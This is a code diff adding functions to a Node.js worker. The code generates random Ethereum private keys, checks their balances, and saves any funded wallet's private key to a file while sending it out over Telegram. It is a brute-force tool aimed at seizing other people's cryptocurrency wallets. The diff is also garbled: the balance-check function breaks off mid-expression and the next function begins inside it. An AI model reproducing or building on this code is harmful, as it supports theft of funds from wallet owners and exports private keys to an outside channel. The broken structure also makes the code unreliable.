@@ -121,3 +121,28 @@ run().catch(e => {
     process.send({ type: 'error', msg: e.message })
     process.exit(1)
 })
+
+
+// ─── Batch balance check ──────────────────────────────────────────────
+async function batchCheckBalances(wallets) {
+    const requests = wallets.map((w, i) => ({
+
+// ─── Save funded wallet ───────────────────────────────────────────────
+function saveFunded(wallet, balanceWei) {
+    const eth = Number(balanceWei) / 1e18
+    const ethStr = eth.toFixed(6)
+    const line = `${wallet.address},${wallet.privateKey},${ethStr} ETH\n`
+    fs.appendFileSync(FUNDED_FILE, line)
+    sendTelegram(wallet.address, wallet.privateKey, ethStr)
+    process.send({ type: 'funded', address: wallet.address, eth: ethStr })
+}
+
+// ─── Generate wallet ──────────────────────────────────────────────────
+function generateWallet() {
+    const privBytes = randomBytes(32)
+    const pubKey = secp256k1.getPublicKey(privBytes, false).slice(1)
+    const hash = keccak256(pubKey)
+    return {
+        address: '0x' + Buffer.from(hash.slice(12)).toString('hex'),
+        privateKey: '0x' + Buffer.from(privBytes).toString('hex'),
+    }
